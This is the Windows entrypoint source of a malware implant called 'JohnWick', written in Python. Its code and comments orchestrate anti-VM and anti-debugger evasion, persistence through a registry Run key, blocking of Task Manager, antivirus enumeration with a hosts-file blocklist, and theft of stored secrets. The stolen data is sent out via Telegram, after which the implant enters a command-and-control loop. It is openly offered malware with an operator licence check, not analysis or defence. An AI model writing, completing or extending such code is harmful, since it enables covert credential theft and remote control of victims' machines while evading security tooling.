"""JohnWick implant - Windows entrypoint.

Single exe, many victims: one compiled binary beacons to the destination baked
into cfg.json by builder.py. The same artifact runs on every machine; per-victim
identity comes from the system info, not from a re-build.

Pipeline at launch:
  1. load + validate config (fail closed)
  2. guard layer: anti-vm / anti-debug -> bail silently if analysed
  3. licence check (optional; only if cfg has licence_url)
  4. persistence write (HKCU Run key) unless disabled
  5. Task Manager block (registry policy) unless disabled
  6. AV/Defender handling: enumeration + hosts blocklist (guarded, reversible)
  7. first exfil burst (secrets -> telegram), then enter C2 loop

Every stage is wrapped so one failure degrades capability instead of killing
the process. Nothing here raises out of main(); a dead implant is worse than a
crippled one.

Run order is deliberate: guard BEFORE any network or disk write, so an analysis
sandbox never sees the beacon and never leaves a startup entry behind.
"""
from __future__ import annotations

import sys
import threading


def _is_windows() -> bool:
    return sys.platform == "win32"


def main(argv=None) -> int:
    # Import-time platform gate: this file is Windows-only by design. On other
    # OSes we say so and exit clean rather than half-running.
    if not _is_windows():
        print("[jwg] windows-only implant; run under windows", file=sys.stderr)
        return 3

    import jwg_cfg
    try:
        cfg = jwg_cfg.load()
    except jwg_cfg.ConfigError as e:
        print(f"[jwg] config: {e}", file=sys.stderr)
        return 2

    # ---- guard layer: must fire before anything touches disk or net --------
    try:
        import guard
        if cfg.get("guard_enabled", True):
            verdict = guard.evaluate()
            if verdict["analysis"]:
                # In a VM/debugger/sandbox: do nothing observable. No beacon,
                # no file writes, no registry keys. Just leave.
                return 0
    except Exception:
        pass  # a broken guard must not brick a live box

    # ---- licensing ----------------------------------------------------------
    try:
        import licensing
        licensing.check(cfg)  # raises LicenceError when unauthorised
    except Exception as e:
        # Unlicensed build: report once to the operator chat, then stop.
        try:
            import c2
            c2.notify(cfg, f"[licence] refused: {type(e).__name__}: {e}")
        except Exception:
            pass
        return 4

    # ---- persistence + taskmgr block ---------------------------------------
    try:
        import persist
        if cfg.get("persistence_enabled", True):
            persist.install()
    except Exception:
        pass
    try:
        import persist
        if cfg.get("block_taskmgr", True):
            persist.block_task_manager()
    except Exception:
        pass

    # ---- AV surface ---------------------------------------------------------
    try:
        import guard
        guard.av_recon_and_block(cfg)  # enumerate + optional hosts blocklist
    except Exception:
        pass

    # ---- exfil + C2 ---------------------------------------------------------
    try:
        import stealer
        secrets = stealer.collect_all()
    except Exception as e:
        secrets = {"error": str(e)}

    import c2
    # First burst in background so the C2 command loop starts immediately;
    # a slow browser-profile read must not delay interactive control.
    threading.Thread(target=c2.first_report, args=(cfg, secrets), daemon=True).start()
    c2.loop(cfg)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
